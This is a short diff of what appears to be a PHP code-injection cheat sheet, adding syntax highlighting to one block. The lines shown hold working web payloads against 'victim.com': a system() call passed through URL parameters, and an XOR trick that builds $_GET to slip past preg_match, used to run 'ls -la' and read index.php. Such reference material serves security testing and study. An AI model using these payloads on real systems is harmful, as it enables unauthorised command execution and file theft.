@@ -137,7 +137,7 @@ victim.com/index.php?func_name=system&argument=ls
 will execute : system('ls')
 ```
 
-```
+```php
 To create GET parameters we will use the XOR operation to bypass the preg_match.
 
 $_ = "`{{{" ^ "?<>/";                   => _GET
@@ -145,7 +145,6 @@ ${$_}[_](${$_}[__]);                    => $_GET[_]($_GET[__])
 ${$_}[_](${$_}[__](${$_}[___]));        => $_GET[_]($_GET[__]($_GET[___]))
 
 victim.com/index.php?code=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);&_=system&__=ls+-la
-
 victim.com/index.php?code=$_="`{{{"^"?<>/";${$_}[_](${$_}[__](${$_}[___]));&_=highlight_string&__=file_get_contents&___=index.php
 ```
 
